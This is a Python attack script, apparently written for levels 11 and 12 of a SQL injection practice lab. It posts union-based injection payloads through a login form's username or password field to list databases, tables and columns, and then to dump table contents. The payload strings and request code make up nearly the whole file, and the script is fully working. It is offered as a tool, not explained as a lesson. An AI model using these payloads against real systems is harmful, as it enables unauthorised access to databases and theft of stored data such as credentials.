import requests
from bs4 import BeautifulSoup

class Less11_Less12(object):

    data = {}

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c,exploit):

        if url[-1] == "/":
            self.url = url
        else:
            self.url = url + "/"

        self.level = level
        self.dbs = dbs
        self.tables = tables           # 初始化参数
        self.columns = columns
        self.schema = schema
        self.d = d
        self.t = t
        self.c = c
        self.exploit = exploit

    def soup(self,text):
        soup = BeautifulSoup(text,"html5lib")
        for each in soup.find_all('font')[3].text.split(":")[-1].split(","):
            print(each)

    def dbs_payload(self):

        if self.level == 11:            # 获取所有数据库名,根据不同的post参数

            if self.exploit == 'username':

                self.data['uname'] = "1admin'union select 1,group_concat(schema_name) from information_schema.schemata #"
                self.data['passwd'] = ''

            elif self.exploit == 'password':

                self.data['uname'] = ''
                self.data['passwd'] = "1admin'union select 1,group_concat(schema_name) from information_schema.schemata #"

        elif self.level == 12:

            if self.exploit == 'username':

                self.data['uname'] = '1admin") union select 1,group_concat(schema_name) from information_schema.schemata #'
                self.data['passwd'] = ''

            elif self.exploit == 'password':

                self.data['uname'] = ''
                self.data['passwd'] = '1admin") union select 1,group_concat(schema_name) from information_schema.schemata #'

        rep = requests.post(self.url,data=self.data)
        self.soup(rep.text)

    def tables_payload(self):

        if self.level == 11:
                                        # 获取所有数据库表的名称，根据不同的等级调用不同的post参数
            if self.exploit == 'username':

                self.data['uname'] = "1admin'union select 1,group_concat(table_name) from information_schema.tables where table_schema='"+self.d+"' #"
                self.data['passwd'] = ""

            elif self.exploit == 'password':

                self.data['uname'] = ""
                self.data['passwd'] = "1admin'union select 1,group_concat(table_name) from information_schema.tables where table_schema='"+self.d+"' #"

        elif self.level == 12:

            if self.exploit == 'username':

                self.data['uname'] = '1admin") union select 1,group_concat(table_name) from information_schema.tables where table_schema="'+self.d+'" #'
                self.data['passwd'] = ''

            elif self.exploit == 'password':

                self.data['uname'] = ''
                self.data['passwd'] = '1admin") union select 1,group_concat(table_name) from information_schema.tables where table_schema="'+self.d+'" #'

        rep = requests.post(self.url,data=self.data)
        self.soup(rep.text)

    def columns_payload(self):

        if self.level == 11:
                                            # 获取所有数据库列的名称，根据不同的等级调用不同的post参数
            if self.exploit == 'username':

                self.data['uname'] = "1admin'union select 1,group_concat(column_name) from information_schema.columns where table_name='"+self.t+"' #"
                self.data['passwd'] = ""

            elif self.exploit == 'password':

                self.data['uname'] = ""
                self.data['passwd'] = "1admin'union select 1,group_concat(column_name) from information_schema.columns where table_name='"+self.t+"' #"

        elif self.level == 12:

            if self.exploit == 'username':

                self.data['uname'] = '1admin") union select 1,group_concat(column_name) from information_schema.columns where table_name="'+self.t+'" #'
                self.data['passwd'] = ''

            elif self.exploit == 'password':
                
                self.data['uname'] = ''
                self.data['passwd'] = '1admin") union select 1,group_concat(column_name) from information_schema.columns where table_name="'+self.t+'" #'

        rep = requests.post(self.url,data=self.data)
        self.soup(rep.text)

    def data_payload(self):

        if self.level == 11: 
                                                # 获取所有数据库里面对应的数据，根据等级不同，调用不同的post参数
            if self.exploit == 'username':

                self.data['uname'] = "1admin'union select 1,group_concat("+self.c+") from "+self.d+"."+self.t+" #"
                self.data['passwd'] = ""

            elif self.exploit == 'password':

                self.data['uname'] = ""
                self.data['passwd'] = "1admin'union select 1,group_concat("+self.c+") from "+self.d+"."+self.t+" #"

        elif self.level == 12:

            if self.exploit == 'username':

                self.data['uname'] = '1admin") union select 1,group_concat('+self.c+') from '+self.d+'.'+self.t+' #'
                self.data['passwd'] = ''

            elif self.exploit == 'password':

                self.data['uname'] = ''
                self.data['passwd'] = '1admin") union select 1,group_concat('+self.c+') from '+self.d+'.'+self.t+' #'

        rep = requests.post(self.url,data=self.data)
        self.soup(rep.text)


    def DBS(self):
        self.dbs_payload()

    def TABLES(self):           # 使用对应的payload
        self.tables_payload()

    def COLUMNS(self):
        self.columns_payload()

    def SCHEMA(self):
        self.data_payload()

    def TYPE(self):

        if self.exploit != '':
            if self.dbs:  # 如果枚举数据库被设置
                self.DBS()

            elif self.d != '' and self.tables: # 如果枚举表和数据库名被设置
                self.TABLES()

            elif self.t != '' and self.columns and self.d != '': # 如果枚举列,和数据表,和数据列被设置
                self.COLUMNS()

            elif self.c != '' and self.t != '' and self.d != '' and self.schema: # 如果数据表,数据库,数据列被设置
                self.SCHEMA()

            else:
                print("wrong options and bad type!")

    def Less_11(self):
        self.TYPE()
                        # 调用
    def Less_12(self):
        self.TYPE()

